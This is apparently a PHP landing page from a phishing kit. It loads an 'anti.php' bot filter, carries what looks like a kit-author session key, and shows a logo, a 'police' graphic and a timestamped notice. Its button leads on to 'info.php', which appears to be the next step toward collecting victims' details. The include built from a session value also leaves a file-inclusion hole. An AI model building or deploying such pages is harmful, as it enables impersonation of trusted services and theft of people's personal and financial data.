<?php

include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title><?php echo $wiz_152 ; ?></title>
  <link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
	<link rel="stylesheet" type="text/css" href="css/poli.css">
</head>
<body>

  <nav>
  	<img src="img/logo.png">
  </nav>

  <div class="wrapp">
  	<div class="content">
  		<div class="cp_left">
  			<img src="img/police.png">
  			<p id="zabi"><?php echo $wiz_153 ; ?></p>
  		</div>
  		<div class="cp_right">
  			<h4><?php echo $wiz_154 ; ?></h4>
  			<p><?php echo $wiz_155 ; ?></p>
  			<div class="mama">
  				<p><?php echo $wiz_156 ; ?></p>
  				<p><?php echo $wiz_157 ; ?></p>
  				<p>5:27 AM</p>
  			</div>
  			<p id="zzz"><?php echo $wiz_158 ; ?></p>
  			<button class="button_next"><a href="info.php"><?php echo $wiz_140 ; ?></a></button>
  		</div>
  	</div>
  </div>


<footer>
	<a href="#"><?php echo $wiz_159 ; ?></a>
	<a href="#"><?php echo $wiz_160 ; ?></a>
	<a href="#"><?php echo $wiz_161 ; ?></a>
</footer>

</body>
</html>